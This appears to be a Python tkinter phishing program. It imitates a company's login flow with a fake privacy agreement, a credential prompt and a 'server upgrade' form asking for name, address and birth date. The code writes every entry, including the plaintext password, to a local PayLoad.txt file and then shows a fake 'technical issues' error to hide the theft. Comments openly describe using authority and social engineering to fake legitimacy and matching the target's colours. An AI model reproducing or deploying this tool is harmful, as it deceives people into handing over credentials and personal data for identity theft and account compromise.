import tkinter as tk
from tkinter import messagebox as tM
from tkinter.ttk import *

''' establishes a class named employee'''
class Employee():
    global p
    #defines an empty dictionary named employee
    employee = {}
    #constructor for object
    def __init__(self, company, username, password):
        '''three attributes company, username, password''' 
        self.company = company
        self.username = username
        self.password = password
        
    '''declares method called payload'''
    def payload(self):
        '''prints the information entered at the login screen'''
        print('\nCompany:', self.company) #prints company
        print('User Name:', self.username)#prints username
        print('Password:', self.password)#prints password
        #adds company, username, and password to dictionary named employee
        employee = {'company name': self.company, 'user name': self.username, 'password Plain': self.password}
        '''opens the PayLoad.txt & writes the contents of the Employee dictionary'''
        with open('text/PayLoad.txt', 'a') as p:
            p.write('\n')            
            p.write(str(employee))

''' establishes a class named Personal'''        
class Personal():
    #defines an empty dictionary named personal
    personal = {}
    #constructor for object
    def __init__(self, firstname, lastname, address, birthday):
        '''four attributes called firstname, lastname, address, birthday'''
        self.firstname= firstname 
        self.lastname = lastname 
        self.address = address 
        self.birthday = birthday 
    '''declares method called payload'''
    def payload(self):
        '''prints the information entered at in contactInformation'''
        print('\nFirst Name:', self.firstname)#prints first name
        print('last name:', self.lastname)#print last name
        print('address:', self.address)#prints address
        print('birth day:', self.birthday)#prints birthday
        #adds firstname, lastname, address, birthday to dictionary named personal      
        personal = {'First Name': self.firstname, 'last name': self.lastname,
                    'address': self.address, 'birth date': self.birthday}
        '''opens the PayLoad.txt & writes the contents of the Persoanl dictionary'''    
        with open('text/PayLoad.txt', 'a') as p:
            p.write('\n')
            p.write(str(personal))
        try:
            if tM.showwarning('Error: 4039A7', 'Website is having technical issues, \nplease try again in a few hours.'):
        #Destroys root when user clicks ok on error
                root.destroy()
        #closes the PayLoad text file
        finally:
            p.close()            
                        
            
            
'''defines a method Submit'''            
def Submit():
    #per1 is defined as Pesonal class
    #per1 holds first_entry, last_entry, addr_entry, birth_entry in it's class
    per1 =  Personal(first_entry.get(), last_entry.get(), addr_entry.get(), birth_entry.get())
    '''prints the payload for emp1 and per1'''
    emp1.payload()
    per1.payload()
#defines a new window called loginWindow
def loginWindow():
    '''declares window, comp_entry, user_entry, passw_entry as global''' 
    global window
    global comp_entry
    global user_entry
    global passw_entry
    '''creats a top level widget called window'''
    window = tk.Toplevel()
    #defines the geometry of window
    window.geometry("700x300")
    '''titles the window as Login'''
    window.title('Login')
    #bg is defined as the photo in local path "images/logo.png"
    bg = tk.PhotoImage(file='images/logo.png')
    #backGround is defined as window with bg image in side
    backGround = Label(window, image=bg)
    #places backGround in x, y coordinates and attributes a relitive height of 1
    backGround.place(x=0, y=0, relwidth=1, relheight=1)
    #destroys fake root window when loginWindow is called      
    if loginWindow:
        r00t.destroy()
    #declares comp_label as header of the user entry box for Company Location
    comp_label = Label(window,  text = 'Company Name: ', 
                           font=('calibre', 12, 'bold'),
                       background = '#232F3E', foreground = '#ffffff')
    #packs comp_label onto the page
    comp_label.pack()
    #comp_entry is deeclared as a user entry box           
    comp_entry = tk.Entry(window, textvariable = comp_var,
                        font=('calibre', 12,'normal'))
    #packs comp_entry ontp the page
    comp_entry.pack()
    #declares user_label for the user_entry text box  
    user_label = tk.Label(window, text = 'Username: ',
                       font=('calibre', 12, 'bold'),
                          background = '#232F3E',foreground = '#ffffff')
    #packs user_label ontp the page
    user_label.pack()
    #user_entry is deeclared as a user entry box
    user_entry = tk.Entry(window, textvariable = user_var,
                        font=('calibre',12,'normal'))
    #packs user_entry ontp the page
    user_entry.pack()
    
    #declares passw_label for the passw_entry text box   
    passw_label = tk.Label(window, text = 'Password: ',
                       font = ('calibre',12,'bold'),
                           background = '#232F3E',
                           foreground = '#ffffff')
    #packs passw_label onto the page
    passw_label.pack()
    ''' passw_entry is declared as a user entry box with *** shown to user '''
    passw_entry = tk.Entry(window, 
                    textvariable = passw_var, 
                    font = ('calibre',12,'normal'), 
                    show = '*')
    #packs passw_entry onto the page
    passw_entry.pack()
       
    #log_btn is declared as a Button that calls contactInfo
    log_btn = tk.Button(window, text ='Login',
                     command = contactInfo)
    #packs log_btn onto the page
    log_btn.pack()
        
    #mainloop for toplevel named window
    window.mainloop()
    
    
#defines a new window called contactInfo
def contactInfo():
    '''declares first_entry, last_entry,
    addr_entry, birth_entry, emp1 global'''
    global first_entry 
    global last_entry
    global addr_entry
    global birth_entry
    global emp1
    #newWindow is declared as top level        
    newWindow = tk.Toplevel()
    #size of newWindow is made 700x500
    newWindow.geometry("700x500")
    #newWindow is given the title "update Contact Information
    newWindow.title('Update Contact Information')
    #bG is declared as the image file in local location "images/ContactInfo.png"
    bG = tk.PhotoImage(file='images/ContactInfo.png')
    #new_window is declared as a Canvas and given Dimensions
    new_window =tk.Canvas(newWindow, width=700, height=500, bd=0, highlightthickness=0)
    #packs the canvas into the new_window
    new_window.pack(fill='both', expand=True)
    #places photo canvas into new_window and anchors it   
    new_window.create_image(0,0, image = bG, anchor = 'nw')
    #declares comp_name as a string of comp_entry
    comp_name = str(comp_entry)
    
    '''adds canvas text as labels for all the entries and given locations'''
    new_window.create_text(350,90, text = comp_var.get(), font = 'calibre 40 bold',)
    new_window.create_text(350,165, text = "We are in the prosses of upgrading our data servers,\n Your help is greatly appreciated.", font = 'calibre 12 bold',)
    new_window.create_text(100,235, text = 'First Name: ', font = 'calibre 12 bold',)    
    new_window.create_text(400,235, text = 'Last Name:', font = 'calibre 12 bold',)
    new_window.create_text(100,325, text = 'Address: ', font = 'calibre 12 bold',)
    new_window.create_text(420,325, text = 'Date of Birth: ', font = 'calibre 12 bold',)
    
    '''entry boxes declared for first_entry, last_entry, addr_entry, birth_entry'''
    first_entry = tk.Entry(newWindow, font=('calibre',14,'normal'), width= 12)
    last_entry = tk.Entry(newWindow, font=('calibre',14,'normal'), width= 12)
    addr_entry = tk.Entry(newWindow, font=('calibre',14,'normal'), width =12)
    birth_entry = tk.Entry(newWindow, font=('calibre',14,'normal'), width =12)
    #sub_btn is declared as a Button that calls Submit
    sub_btn = Button(newWindow, text = 'Next', command = Submit)
    
    '''creates windows for all entry boxes and button declared above
    places them on x, y coordinates on the canvas'''
    new_window.create_window(100,260, anchor ='nw', window=first_entry)
    new_window.create_window(400,260, anchor ='nw', window=last_entry)
    new_window.create_window(100,360, anchor ='nw', window=addr_entry)
    new_window.create_window(400,360, anchor ='nw', window=birth_entry)
    new_window.create_window(500,450, anchor ='nw', window=sub_btn)
   
   #emp1 is declared as Employee class and retreves comp_entry,user_entry, passw_entry as attributes
    emp1 = Employee(comp_entry.get(), user_entry.get(), passw_entry.get())
    
    #closes window contactInfo is called    
    if contactInfo:
        window.destroy()    
    
    #mainloop for newWindow        
    newWindow.mainloop()

''' defines a class as a Frame named Privacy Agreement'''
class PrivacyAgreement(tk.Frame):
    #constructor for object PrivacyAgreement
    def __init__(self,one):
        # Declares frame as self
        tk.Frame.__init__(self, one)
        ''' creats white canvas and frames'''
        self.canvas = tk.Canvas(self, borderwidth=0, background="#ffffff")
        self.frame = tk.Frame(self.canvas, background="#ffffff")
        '''creats scroll bars and gives them directions x and y'''
        self.scroll = tk.Scrollbar(self, orient="vertical", command=self.canvas.yview)
        self.canvas.configure(yscrollcommand=self.scroll.set)
        self.xscroll = tk.Scrollbar(self, orient="horizontal", command=self.canvas.xview)
        self.canvas.configure(xscrollcommand=self.xscroll.set)
        
        '''Packs the scroll bars to corrisponding vertical and horizontle locations'''
        self.xscroll.pack(side="bottom", fill='x')
        self.scroll.pack(side="right", fill="y")
        self.canvas.pack(side="left", fill="y", expand=True)
        self.canvas.pack(side="right", fill="y", expand=True)
        self.canvas.create_window((4,4), window=self.frame, anchor="nw",
                                  tags="self.frame")
        #binds the scroll funtion to the text box
        self.frame.bind("<Configure>", self.onFrameConfigure)
        
        #calls the text file to populate textbox
        self.populate()
    '''defines method as populate'''
    def populate(self):
        '''Using Authority and social engeneering I wrote this section to 
        gives false sence of security while pretending to be legitimate.
        Can easily change user agreement by changing the "PrivacyAgreement.txt" in th folder.'''
        try:
            for row in range(2):
                '''reads fake privacy agreement text file'''
                f = open('text/PrivacyAgreement.txt', 'r',encoding='UTf-8') # I ran into a windows specific issue without encoding
                t = f.read()
                #packs PrivacyAgreement into the canvas frame in r00t
                tk.Label(self.frame, text=t).pack()
                

        finally:
            f.close()            
                                   

    '''defines method onFrameConfigure'''       
    def onFrameConfigure(self, event):
        '''Sets the scroll region for all the inner frame'''
        self.canvas.configure(scrollregion=self.canvas.bbox("all"))

'''when check box is clicked agree_btn appears'''
def checkBox():
    try:
        #checks if the value for agree_btn is checked        
        if check_var.get() > 1:      #gets value of check box, 
            agree_btn.pack(padx=40)  #if greater than 1 it packs the agree_btn
            '''if it is not checked it removes button'''
        elif check_var.get() < 2:    #check agree_btn again,
            agree_btn.pack_forget()  #if less than 2 it removes agree_btn
    finally:
        pass
 

'''Protects from accidentally invoking
the real root when program didn't intend to,
provides a means of persistance if user closes scripts'''
if __name__ == "__main__":
    #Establishes Window
    root=tk.Tk()
    #I used this to have a seperate window from root 
    root.iconify()
    #creats a fake toplevel r00t
    r00t=tk.Toplevel()
    #gives the toplevel r00t a size of 700 x 500 
    r00t.geometry("700x500")
    #configues r00t with a blue color that matches target
    r00t.configure(bg='#232F3E')
    #names toplevel Privacey Agreement
    r00t.title('Privacy Agreement')   
    # Destroy the root after 8 minutes
    #1000' for every second or '60,000' for every minute
    r00t.after(480000, root.destroy)
    
    #defines agree as PrivacyAgreement as toplevel r00t
    agree = PrivacyAgreement(r00t)
    #packs agree and expands it
    agree.pack(side='top', fill="both", expand=True)


    #creats a variable called check_var   
    check_var = tk.IntVar()
    #check_btn is difines as a check button that calls checkBox
    check_btn = Checkbutton(r00t, text= ' I Agree', 
                            variable = check_var, onvalue = 2,
                            offvalue = 1, width=0, command = checkBox)
    #check_btn.configure()
    agree_btn = tk.Button(r00t, text ='Agree',  bg= 'white',
                          fg ='#232F3E', command = loginWindow)
    #packs check_btn onto the page    
    check_btn.pack()

    '''All the string variables
    needed for this script'''
    sesh_var=tk.StringVar()
    comp_var=tk.StringVar()
    user_var=tk.StringVar()
    passw_var=tk.StringVar()
    first_var=tk.StringVar()
    last_var=tk.StringVar()
    address_var=tk.StringVar()
    birth_var=tk.StringVar()
  

#main window loop
root.mainloop()